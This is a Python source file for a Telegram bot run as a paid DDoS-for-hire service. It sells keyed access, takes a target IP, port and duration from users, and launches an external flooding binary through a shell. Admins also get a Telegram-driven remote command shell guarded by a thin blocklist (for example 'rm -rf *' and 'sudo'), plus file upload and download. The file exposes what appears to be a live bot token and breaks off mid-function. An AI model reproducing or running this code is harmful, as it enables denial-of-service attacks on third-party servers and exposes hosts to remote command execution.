
import os
import time
import json
import pytz
import json
import shutil
import random
import string
import telebot
import datetime
import subprocess
import threading
from telebot import types
from typing import Optional

# --------------------[ CONFIGURATION ]----------------------


# Insert your Telegram bot token here
bot = telebot.TeleBot('7635786772:AAHRopYwMGquagLiEXEnhCBUCMJOLeU1Wqg')

# Insert your admin id here
admin_id = ["529691217"]

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
KEY_COSTS = {1: 80, 7: 400, 30: 1000}
UPDATE_INTERVAL = 1  # Update interval for countdown timer in seconds

# --------------------[ IN-MEMORY STORAGE ]----------------------

keys = {}
bot_data = {}
admin_sessions = {}
attack_status = {}
message_store = {}
user_cooldowns = {}
user_last_attack = {}
attack_in_process = False
attack_start_time: Optional[datetime.datetime] = None
attack_duration = 0
users = {}  # Dictionary to store user access information
active_timers = {}  # Track active countdown timers

# --------------------[ STORAGE ]----------------------



# --- Data Loading and Saving Functions ---

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)
        
def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
     
try:
    with open("reseller.json", "r") as f:
        resellers = json.load(f)
except FileNotFoundError:
    resellers = {}
    
def save_resellers():
    with open("reseller.json", "w") as f:
        json.dump(resellers, f, indent=4)
    
def generate_key(duration):
    characters = string.ascii_letters + string.digits
    random_part = ''.join(random.choice(characters) for _ in range(10)).upper()
    return f"NINJA-{duration.upper()}-{random_part}"

def add_time_to_current_date(hours=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

def convert_utc_to_ist(utc_time_str):
    utc_time = datetime.datetime.strptime(utc_time_str, '%Y-%m-%d %H:%M:%S')
    utc_time = utc_time.replace(tzinfo=pytz.utc)
    ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
    return ist_time.strftime('%Y-%m-%d %H:%M:%S')
    
def load_config():
    config_file = "config.json"

    if not os.path.exists(config_file):
        print(f"Config file {config_file} does not exist. Please create it.")
        exit(1)

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in {config_file}: {str(e)}")
        exit(1)
    
config = load_config()

# --- Extract values from config.json ---
full_command_type = config["initial_parameters"]
threads = config.get("initial_threads")
packets = config.get("initial_packets")
BINARY = config.get("initial_binary")
MAX_ATTACK_TIME = config.get("max_attack_time")
ATTACK_COOLDOWN = config.get("attack_cooldown")

def save_config():
    config = {
        "initial_parameters": full_command_type,
        "initial_threads": threads,
        "initial_packets": packets,
        "initial_binary": BINARY,
        "max_attack_time": MAX_ATTACK_TIME,
        "attack_cooldown": ATTACK_COOLDOWN
    }

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# --- Log command function ---
def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEYBOARD BUTTONS ]----------------------
    
@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    # Define buttons
    attack_button = types.KeyboardButton("ðŸš€ Attack")
    myinfo_button = types.KeyboardButton("ðŸ‘¤ My Info")
    redeem_button = types.KeyboardButton("ðŸŽŸï¸ Redeem Key")
    settings_button = types.KeyboardButton("âš™ï¸ Settings")
    terminal_button = types.KeyboardButton("âºï¸ Terminal")
    panel_button = types.KeyboardButton("ðŸ”° Panel")  # Adjusted label for clarity
        
    if str(message.chat.id) in resellers:
        markup.add(attack_button, myinfo_button, redeem_button, panel_button)
        
    elif str(message.chat.id) in admin_id:
        markup.add(attack_button, myinfo_button, redeem_button, settings_button, terminal_button, panel_button)
        
    else:
        markup.add(attack_button, myinfo_button, redeem_button)
        
    bot.reply_to(message, "ð—ªð—²ð—¹ð—°ð—¼ð—ºð—² ð˜ð—¼ NINJA ð—¯ð—¼ð˜!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "âš™ï¸ Settings")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        threads_button = types.KeyboardButton("Threads")
        packets_button = types.KeyboardButton("Packets")
        binary_button = types.KeyboardButton("Binary")
        command_button = types.KeyboardButton("Parameters")
        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
        attack_time_button = types.KeyboardButton("Attack Time")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, back_button)
        bot.reply_to(message, "âš™ï¸ ð—¦ð—˜ð—§ð—§ð—œð—¡ð—š ð— ð—˜ð—¡ð—¨", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        
@bot.message_handler(func=lambda message: message.text == "âºï¸ Terminal")
def terminal_menu(message):
    """Show the terminal menu for admins."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        download_button = types.KeyboardButton("Download")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, download_button, back_button)
        bot.reply_to(message, "âš™ï¸ ð—§ð—˜ð—¥ð— ð—œð—¡ð—”ð—Ÿ ð— ð—˜ð—¡ð—¨", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        
@bot.message_handler(func=lambda message: message.text == "ðŸ”° Panel")
def show_admin_panel(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or resellers:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        admin_button = types.KeyboardButton("Admin Panel")
        reseller_manager_button = types.KeyboardButton("Reseller Panel")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(admin_button, reseller_manager_button, back_button)

        bot.reply_to(message, "ðŸ”° ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        
@bot.message_handler(func=lambda message: message.text == "Admin Panel")
def show_key_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        genkey_button = types.KeyboardButton("Generate Key")
        controll_button = types.KeyboardButton("Controll Access")
        add_user_button = types.KeyboardButton("Add User")
        unused_keys_button = types.KeyboardButton("Unused Keys")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(genkey_button, add_user_button, unused_keys_button, controll_button, back_button)

        bot.reply_to(message, "â˜£ï¸ ð—”ð——ð— ð—œð—¡ ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        
@bot.message_handler(func=lambda message: message.text == "Reseller Panel")
def show_access_manager(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or resellers:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

        genkey_button = types.KeyboardButton("Generate Key")
        balance_button = types.KeyboardButton("Balance")
        back_button = types.KeyboardButton("<< Back to Menu")
                
        markup.add(balance_button, genkey_button, back_button)
        bot.reply_to(message, "ðŸ› ï¸ ð—¥ð—˜ð—¦ð—˜ð—Ÿð—Ÿð—˜ð—¥ ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    start_command(message)

# ------------------------------------------------------------
    
    
    
    
# --------------------[ ATTACK SECTION ]----------------------


@bot.message_handler(func=lambda message: message.text == "ðŸš€ Attack")
def handle_attack(message):
    global attack_in_process
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "â—ï¸ð—¬ð—¼ð˜‚ð—¿ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—²ð˜…ð—½ð—¶ð—¿ð—²ð—±â—ï¸"
            bot.reply_to(message, response)
            return       
    else:
        bot.reply_to(message, "â›”ï¸ ð—¨ð—»ð—®ð˜‚ð˜ð—¼ð—¿ð—¶ð˜€ð—²ð—± ð—”ð—°ð—°ð—²ð˜€ð˜€! â›”ï¸\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\nðŸ‘‰ Contact an Admin or the Owner for approval.\nðŸŒŸ Become a proud supporter and purchase approval.\nðŸ’¬ Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
        return
    
    if attack_in_process:
        bot.reply_to(message, "â›”ï¸ ð—”ð—» ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.\nð—¨ð˜€ð—² /check ð˜ð—¼ ð˜€ð—²ð—² ð—¿ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²!")
        return

    if attack_in_process:
        bot.reply_to(message, "â›”ï¸ ð—”ð—» ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.\nð—¨ð˜€ð—² /check ð˜ð—¼ ð˜€ð—²ð—² ð—¿ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²!")
        return

    response = "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð˜ð—®ð—¿ð—´ð—²ð˜ ð—¶ð—½, ð—½ð—¼ð—¿ð˜ ð—®ð—»ð—± ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€ ð˜€ð—²ð—½ð—®ð—¿ð—®ð˜ð—²ð—± ð—¯ð˜† ð˜€ð—½ð—®ð—°ð—²"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)
     
def format_countdown_message(target: str, port: int, time_remaining: int, username: str) -> str:
    """Format the countdown message with attack details"""
    return (f"ðŸš€ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—¦ð—²ð—»ð˜ ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†! ðŸš€\n\n"
            f"ð—§ð—®ð—¿ð—´ð—²ð˜: {target}:{port}\n"
            f"ð—§ð—¶ð—ºð—²: {time_remaining} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€\n"
            f"ð—”ð˜ð˜ð—®ð—°ð—¸ð—²ð—¿: @{username}")

def update_countdown_timer(message_id: int, chat_id: int, target: str, port: int, duration: int, username: str) -> None:
    """Update the countdown timer in real-time"""
    timer_key = f"{chat_id}:{message_id}"
    active_timers[timer_key] = True
    end_time = time.time() + duration

    while time.time() < end_time and active_timers.get(timer_key, False):
        remaining_time = int(end_time - time.time())

        # Ensure we don't skip any seconds
        if remaining_time <= 0:
            remaining_time = 0

        try:
            updated_text = format_countdown_message(target, port, remaining_time, username)
            bot.edit_message_text(
                text=updated_text,
                chat_id=chat_id,
                message_id=message_id
            )

            # Sleep until the start of the next second
            next_second = end_time - remaining_time
            time_to_sleep = next_second - time.time()
            
            # If time_to_sleep is negative (if we are already past the next second), just move on to the next iteration
            if time_to_sleep > 0:
                time.sleep(time_to_sleep)

        except Exception as e:
            print(f"Error updating countdown: {e}")
            break

    active_timers.pop(timer_key, None)

def stop_timer(chat_id: int, message_id: int) -> None:
    """Stop a specific countdown timer"""
    timer_key = f"{chat_id}:{message_id}"
    active_timers.pop(timer_key, None)

def run_attack(command: str) -> None:
    """Execute the attack command"""
    subprocess.Popen(command, shell=True)

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration
    user_id = str(message.chat.id)
    details = message.text.split()
    binary_name = f"{BINARY}{user_id}"

    if len(details) != 3:
        bot.reply_to(message, "â—ï¸ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—™ð—¼ð—¿ð—ºð—®ð˜â—ï¸\n")
        return

    if user_id in user_last_attack:
        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
            bot.reply_to(message, f"â›” ð—¬ð—¼ð˜‚ ð—»ð—²ð—²ð—± ð˜ð—¼ ð˜„ð—®ð—¶ð˜ {remaining_cooldown} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€ ð—¯ð—²ð—³ð—¼ð—¿ð—² ð—®ð˜ð˜ð—®ð—°ð—¸ð—¶ð—»ð—´ ð—®ð—´ð—®ð—¶ð—».")
            return

    try:
        target = details[0]
        port = int(details[1])
        time_duration = int(details[2])

        # Security checks
        if not target.startswith(ALLOWED_IP_PREFIXES):
            bot.reply_to(message, "â›”ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿: ð—¨ð˜€ð—² ð˜ƒð—®ð—¹ð—¶ð—± ð—œð—£ ð˜ð—¼ ð—®ð˜ð˜ð—®ð—°ð—¸")
            return

        if port not in ALLOWED_PORT_RANGE:
            bot.reply_to(message, f"â›”ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—®ð—¿ð—² ð—¼ð—»ð—¹ð˜† ð—®ð—¹ð—¹ð—¼ð˜„ð—²ð—± ð—¼ð—» ð—½ð—¼ð—¿ð˜ð˜€ ð—¯ð—²ð˜ð˜„ð—²ð—²ð—» [10003 - 29999]")
            return

        if port in BLOCKED_PORTS:
            bot.reply_to(message, f"â›”ï¸ ð—£ð—¼ð—¿ð˜ {port} ð—¶ð˜€ ð—¯ð—¹ð—¼ð—°ð—¸ð—²ð—± ð—®ð—»ð—± ð—°ð—®ð—»ð—»ð—¼ð˜ ð—¯ð—² ð˜‚ð˜€ð—²ð—±!")
            return

        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"â›”ï¸ ð— ð—®ð˜…ð—¶ð—ºð˜‚ð—º ð—®ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—² ð—¶ð˜€ {MAX_ATTACK_TIME} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€!")
            return

        # Set up attack command
        log_command(user_id, target, port, time_duration)
        if full_command_type == 1:
            full_command = f"./{binary_name} {target} {port} {time_duration}"
        elif full_command_type == 2:
            full_command = f"./{binary_name} {target} {port} {time_duration} {threads}"
        elif full_command_type == 3:
            full_command = f"./{binary_name} {target} {port} {time_duration} {packets} {threads}"
        else:
            bot.reply_to(message, "â›”ï¸ ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—°ð—¼ð—ºð—ºð—®ð—»ð—± ð˜ð˜†ð—½ð—²!")
            return

        username = message.chat.username or "No username"

        # Set attack status
        attack_in_process = True
        attack_start_time = datetime.datetime.now()
        attack_duration = time_duration
        user_last_attack[user_id] = datetime.datetime.now()

        # Send initial attack message with countdown
        initial_message = format_countdown_message(target, port, time_duration, username)
        sent_message = bot.reply_to(message, initial_message)

        # Start countdown timer in separate thread
        timer_thread = threading.Thread(
            target=update_countdown_timer,
            args=(sent_message.message_id, message.chat.id, target, port, time_duration, username))
            
        timer_thread.daemon = True
        timer_thread.start()

        # Run attack in separate thread
        attack_thread = threading.Thread(target=run_attack, args=(full_command,))
        attack_thread.daemon = True
        attack_thread.start()

        # Schedule attack status reset
        threading.Timer(time_duration, reset_attack_status, args=[user_id]).start()

    except ValueError:
        bot.reply_to(message, "â—ï¸ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—™ð—¼ð—¿ð—ºð—®ð˜â—ï¸")

@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process and attack_start_time is not None:
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)

        if remaining_time > 0:
            response = f"ðŸš¨ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—¶ð—» ð—½ð—¿ð—¼ð—´ð—¿ð—²ð˜€ð˜€! ðŸš¨\n\nð—¥ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²: {int(remaining_time)} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€."
        else:
            response = "âœ… ð—§ð—µð—² ð—®ð˜ð˜ð—®ð—°ð—¸ ð—µð—®ð˜€ ð—³ð—¶ð—»ð—¶ð˜€ð—µð—²ð—±!"
    else:
        response = "âœ… ð—¡ð—¼ ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—°ð˜‚ð—¿ð—¿ð—²ð—»ð˜ð—¹ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—´ð—¿ð—²ð˜€ð˜€"

    bot.reply_to(message, response)

def reset_attack_status(user_id):
    global attack_in_process
    attack_in_process = False
    bot.send_message(user_id, "âœ… ð—”ð˜ð˜ð—®ð—°ð—¸ ð—³ð—¶ð—»ð—¶ð˜€ð—µð—²ð—±!")
    
# ---------------------------------------------------------------------
#   
#
#
#
# --------------------[ USERS AND SYSTEM INFO ]----------------------

@bot.message_handler(func=lambda message: message.text == "ðŸ‘¤ My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    current_time = datetime.datetime.now()
    role = "Admin" if user_id in admin_id else "User"

    # Get expiration date safely
    expiration_date = users.get(user_id)

    if expiration_date:
        try:
            exp_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')
            if current_time < exp_datetime:
                status = "Active âœ…"
                expiry_text = f"ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: {convert_utc_to_ist(expiration_date)}\n"
            else:
                status = "Inactive âŒ"
                expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Expired ðŸš«\n"  
        except ValueError:
            status = "Inactive âŒ"
            expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Expired ðŸš«\n"
    else:
        status = "Inactive âŒ"
        expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Not approved\n"

    response = (
        f"ðŸ‘¤ ð—¨ð—¦ð—˜ð—¥ ð—œð—¡ð—™ð—¢ð—¥ð— ð—”ð—§ð—œð—¢ð—¡ ðŸ‘¤\n\n"
        f"ðŸ›‚ ð—¥ð—¼ð—¹ð—²: {role}\n"
        f"â„¹ï¸ ð—¨ð˜€ð—²ð—¿ð—»ð—®ð—ºð—²: @{username}\n"
        f"ðŸ†” ð—¨ð˜€ð—²ð—¿ð—œð——: {user_id}\n"
        f"ðŸ“³ ð—¦ð˜ð—®ð˜ð˜‚ð˜€: {status}\n"
        f"{expiry_text}"
    )

    bot.reply_to(message, response)
	
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current status for threads, packets, and command type."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Prepare the status message
        status_message = (
            f"â˜£ï¸ ð—”ð—§ð—§ð—”ð—–ð—ž ð—¦ð—§ð—”ð—§ð—¨ð—¦ â˜£ï¸\n\n"
            f"â–¶ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—»: {ATTACK_COOLDOWN}\n"
            f"â–¶ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—²: {MAX_ATTACK_TIME}\n\n"
            f"-----------------------------------\n"
            f"âœ´ï¸ ð—”ð—§ð—§ð—”ð—–ð—ž ð—¦ð—˜ð—§ð—§ð—œð—¡ð—šð—¦ âœ´ï¸\n\n"
            f"â–¶ï¸ ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€: {full_command_type}\n" 
            f"â–¶ï¸ ð—•ð—¶ð—»ð—®ð—¿ð˜† ð—»ð—®ð—ºð—²: {BINARY}\n"
            f"â–¶ï¸ ð—§ð—µð—¿ð—²ð—®ð—±ð˜€: {threads}\n"
            f"â–¶ï¸ ð—£ð—®ð—°ð—¸ð—²ð˜ð˜€: {packets}\n"
        )
        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—» @NINJAGAMEROP.")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

# List of blocked command prefixes
blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *", "screen"]

@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_terminal(message):
    """Handle sending commands to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—°ð—¼ð—ºð—ºð—®ð—»ð—±:")
        bot.register_next_step_handler(message, execute_terminal_command)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def execute_terminal_command(message):
    """Execute the terminal command entered by the admin."""
    try:
        command = message.text.strip()
        
        # Check if the command starts with any of the blocked prefixes
        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
            bot.reply_to(message, "â—ï¸ð—§ð—µð—¶ð˜€ ð—°ð—¼ð—ºð—ºð—®ð—»ð—± ð—¶ð˜€ ð—¯ð—¹ð—¼ð—°ð—¸ð—²ð—±.")
            return
        
        # Execute the command if it's not blocked
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            bot.reply_to(message, f"âºï¸ ð—–ð—¼ð—ºð—ºð—®ð—»ð—± ð—¢ð˜‚ð˜ð—½ð˜‚ð˜:\n`{output}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "âœ… ð—–ð—¼ð—ºð—ºð—®ð—»ð—± ð—²ð˜…ð—²ð—°ð˜‚ð˜ð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜‚ð—¹ð—¹ð˜†")
    except Exception as e:
        bot.reply_to(message, f"â—ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿ ð—˜ð˜…ð—²ð—°ð˜‚ð˜ð—¶ð—»ð—´ ð—°ð—¼ð—ºð—ºð—®ð—»ð—±: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_terminal(message):
    """Handle file upload to terminal for admins @NINJAGAMEROP."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        sent_msg = bot.reply_to(message, "ðŸ“¤ ð—¦ð—²ð—»ð—± ð—® ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð˜‚ð—½ð—¹ð—¼ð—®ð—±.")
        bot.register_next_step_handler(message, process_file_upload, sent_msg.message_id)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def upload_animation(chat_id, message_id, stop_event):
    """Looping animation for uploading progress."""
    dots = [".", "..", "..."]
    i = 0
    while not stop_event.is_set():  
        try:
            bot.edit_message_text(f"ðŸ“¤ ð—¨ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´{dots[i]}", chat_id=chat_id, message_id=message_id)
            i = (i + 1) % len(dots)  # Cycle through [.", "..", "..."]
            time.sleep(0.3)  # Small delay to simulate progress
        except Exception as e:
            print(f"Error updating animation: {e}")  # Log any errors

def process_file_upload(message):
    """Process the uploaded file while showing a looping animation."""
    if message.document:
        try:
            # Start uploading message
            upload_msg = bot.reply_to(message, "ðŸ“¤ ð—¨ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´")

            # Start animation in a separate thread
            stop_event = threading.Event()
            animation_thread = threading.Thread(target=upload_animation, args=(message.chat.id, upload_msg.message_id, stop_event))
            animation_thread.start()

            # Get file info and download it
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            # Get the current script directory
            current_dir = os.path.dirname(os.path.abspath(__file__))

            # Save the file in the same directory
            file_path = os.path.join(current_dir, message.document.file_name)
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            # Stop animation
            stop_event.set()
            animation_thread.join()

            # Convert animation message to success message
            bot.edit_message_text(f"âœ… ð—™ð—¶ð—¹ð—² ð˜‚ð—½ð—¹ð—¼ð—®ð—±ð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†:\n`{file_path}`",  
                                  chat_id=message.chat.id,  
                                  message_id=upload_msg.message_id,  
                                  parse_mode="Markdown")

        except Exception as e:
            stop_event.set()  # Ensure animation stops if there's an error
            bot.reply_to(message, f"â—ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿ ð˜‚ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—²: {str(e)}")
    else:
        bot.reply_to(message, "â—ï¸ ð—¦ð—²ð—»ð—± ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð˜‚ð—½ð—¹ð—¼ð—®ð—±.")

@bot.message_handler(func=lambda message: message.text == "Download")
def list_files(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.send_message(message.chat.id, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¢ð—»ð—¹ð˜† ð—®ð—±ð—ºð—¶ð—»ð˜€ ð—°ð—®ð—» ð—±ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—± ð—³ð—¶ð—¹ð—²ð˜€.")
        return

    files = [f for f in os.listdir() if os.path.isfile(f)]  # Get all files in directory

    if not files:
        bot.send_message(message.chat.id, "ðŸ“ ð—¡ð—¼ ð—³ð—¶ð—¹ð—²ð˜€ ð—®ð˜ƒð—®ð—¶ð—¹ð—®ð—¯ð—¹ð—² ð—¶ð—» ð˜ð—µð—² ð—±ð—¶ð—¿ð—²ð—°ð˜ð—¼ð—¿ð˜†.")
        return

    markup = types.InlineKeyboardMarkup()
    
    # Create buttons for each file
    for file in files:
        markup.add(types.InlineKeyboardButton(file, callback_data=f"download_{file}"))

    # Store message ID for animation update
    msg = bot.send_message(message.chat.id, "ðŸ“‚ ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—® ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð—±ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±:", reply_markup=markup)
    bot.register_next_step_handler(msg, lambda _: None)  # Prevents further interactions

@bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
def send_file(call):
    user_id = str(call.message.chat.id)

    if user_id not in admin_id:
